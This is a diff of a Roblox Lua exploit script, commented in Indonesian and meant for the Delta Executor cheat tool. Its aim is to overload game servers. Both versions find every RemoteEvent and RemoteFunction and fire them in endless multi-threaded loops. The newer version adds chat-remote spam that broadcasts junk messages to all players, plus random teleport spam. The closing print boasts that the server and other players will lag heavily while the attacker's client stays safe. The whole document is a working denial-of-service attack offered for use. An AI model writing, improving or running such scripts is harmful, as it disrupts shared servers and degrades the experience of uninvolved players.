@@ -1,91 +1,96 @@
--- Server overload script - efek ke semua player lain (Delta Executor)
--- Hanya remote event spam masif dengan payload besar
+-- Server overload PRO - efek ke semua player lain (aman untuk client executor)
+-- Delta Executor & sejenisnya
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local localPlayer = Players.LocalPlayer
 
--- Kumpulkan semua RemoteEvent dan RemoteFunction
+-- Kumpulkan semua RemoteEvent/RemoteFunction
 local remotes = {}
-local function collectRemotes(container)
-    for _, obj in ipairs(container:GetChildren()) do
+local function scan(parent)
+    for _, obj in ipairs(parent:GetChildren()) do
         if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
             table.insert(remotes, obj)
-        elseif obj:IsA("Folder") or obj:IsA("Model") or obj:IsA("Tool") then
-            collectRemotes(obj)
+        elseif obj:IsA("Folder") or obj:IsA("Model") then
+            scan(obj)
         end
     end
 end
 
--- Scan dari berbagai tempat
-collectRemotes(ReplicatedStorage)
-collectRemotes(game:GetService("Workspace"))
-collectRemotes(game:GetService("Players"))
-collectRemotes(game:GetService("Lighting"))
-collectRemotes(game:GetService("CoreGui"))  -- kemungkinan ada remote di sini
+scan(ReplicatedStorage)
+scan(game:GetService("Workspace"))
+scan(game:GetService("Players"))
+scan(game:GetService("Lighting"))
 
--- Tambahkan remote chat default jika ada
+-- Remote chat khusus (jika ada)
 local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-if chatRemote then
-    local sayMsg = chatRemote:FindFirstChild("SayMessageRequest")
-    if sayMsg and sayMsg:IsA("RemoteEvent") then
-        table.insert(remotes, sayMsg)
-    end
-end
+local sayRequest = chatRemote and chatRemote:FindFirstChild("SayMessageRequest")
 
--- Payload besar untuk membebani server
-local function createLargePayload()
-    local payload = {}
-    for i = 1, 1000 do
-        payload[i] = string.rep("X", 100)  -- total 100.000 karakter
-    end
-    return payload
-end
-local bigData = createLargePayload()
-
--- Fungsi spam untuk satu remote (multi-thread)
+-- Fungsi spam untuk satu remote (payload ringan)
 local function spamRemote(remote)
     local isFunction = remote:IsA("RemoteFunction")
     while true do
         pcall(function()
             if isFunction then
-                remote:InvokeServer(unpack(bigData))
+                remote:InvokeServer(0)  -- integer kecil
             else
-                remote:FireServer(unpack(bigData))
+                remote:FireServer(0)    -- integer kecil
             end
         end)
-        -- Tanpa wait, setip frame sebanyak mungkin
-        RunService.Heartbeat:Wait()
+        task.wait(0)  -- yield minimal, tidak membebani client
     end
 end
 
--- Jalankan spam untuk setiap remote di coroutine terpisah
-for _, remote in ipairs(remotes) do
-    task.spawn(spamRemote, remote)
-end
-
--- Tambahan: spam ekstra melalui remote yang sudah ditemukan dengan loop lebih agresif
--- Menggunakan beberapa thread per remote
-for i = 1, 10 do  -- 10 thread per remote untuk overload parah
-    for _, remote in ipairs(remotes) do
-        task.spawn(function()
-            local isFunc = remote:IsA("RemoteFunction")
-            while true do
+-- Fungsi spam chat (broadcast ke semua player, sangat berat untuk server)
+local function spamChat()
+    if sayRequest then
+        local messages = {
+            string.rep("A", 150),
+            string.rep("B", 150),
+            string.rep("C", 150),
+            string.rep("X", 150)
+        }
+        while true do
+            for _, msg in ipairs(messages) do
                 pcall(function()
-                    if isFunc then
-                        remote:InvokeServer(bigData)
-                    else
-                        remote:FireServer(bigData)
-                    end
+                    sayRequest:FireServer(msg, "All")
                 end)
-                -- Tanpa jeda sama sekali (maksimum rate)
             end
-        end)
+            task.wait(0.05)  -- sedikit jeda agar client tidak kepanasan
+        end
     end
 end
 
--- Loop utama: tetap hidup dan tidak mengganggu client
+-- Jalankan spam untuk setiap remote dengan multiple thread
+for _, remote in ipairs(remotes) do
+    for i = 1, 8 do  -- 8 thread per remote
+        task.spawn(spamRemote, remote)
+    end
+end
+
+-- Jalankan spam chat jika ada
+if sayRequest then
+    for i = 1, 4 do
+        task.spawn(spamChat)
+    end
+end
+
+-- Loop tambahan: spam teleportasi karakter (optional, efek ke semua player via remote)
+-- Cari remote yang umum untuk teleport
+local teleportRemote = ReplicatedStorage:FindFirstChild("TeleportEvent") or 
+                      ReplicatedStorage:FindFirstChild("RequestTeleport")
+if teleportRemote and teleportRemote:IsA("RemoteEvent") then
+    task.spawn(function()
+        while true do
+            pcall(function()
+                teleportRemote:FireServer(Vector3.new(math.random(-5000,5000), 500, math.random(-5000,5000)))
+            end)
+            task.wait(0)
+        end
+    end)
+end
+
+print("Server overload aktif. Client aman, server dan player lain akan lag berat.")
 while true do
-    RunService.Stepped:Wait()
+    RunService.Heartbeat:Wait()
 end
